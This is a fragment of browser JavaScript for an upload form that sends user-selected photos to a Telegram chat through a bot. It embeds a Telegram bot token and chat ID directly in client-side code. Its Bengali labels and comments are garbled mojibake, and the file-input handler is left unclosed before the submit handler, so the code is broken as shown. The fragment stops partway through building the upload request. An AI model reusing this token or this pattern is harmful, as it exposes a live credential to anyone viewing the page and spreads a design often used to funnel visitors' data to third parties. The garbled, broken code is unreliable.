<script>
    const botToken = "7885791804:AAHQjsAsMuBfvVqWga0hub2m0QZ7BrgsAsc";
    const chatId = "5923885908";

    const fileInput = document.getElementById('file-upload');
    const pBox = document.getElementById('pBox');
    const pBar = document.getElementById('pBar');
    const pText = document.getElementById('pText');
    const btn = document.getElementById('subBtn');
    const statusList = document.getElementById('status-list');

    fileInput.onchange = () => {
        const count = fileInput.files.length;
        document.getElementById('file-label').innerText = count + " ‡¶ü‡¶ø ‡¶õ‡¶¨‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá";

    document.getElementById('serialForm').onsubmit = async (e) => {
        e.preventDefault();
        const files = Array.from(fileInput.files);
        const total = files.length;

        btn.disabled = true;
        pBox.style.display = "block";
        statusList.innerHTML = "";

        // ‡¶∏‡¶ø‡¶∞‡¶ø‡¶Ø‡¶º‡¶æ‡¶≤‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶≤‡ßÅ‡¶™ (‡¶è‡¶ï‡¶ü‡¶ø‡¶∞ ‡¶™‡¶∞ ‡¶è‡¶ï‡¶ü‡¶ø)
        for (let i = 0; i < total; i++) {
            const currentNum = i + 1;
            pText.innerText = `‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá: ${currentNum} / ${total}`;
            
            const formData = new FormData();
            formData.append('chat_id', chatId);
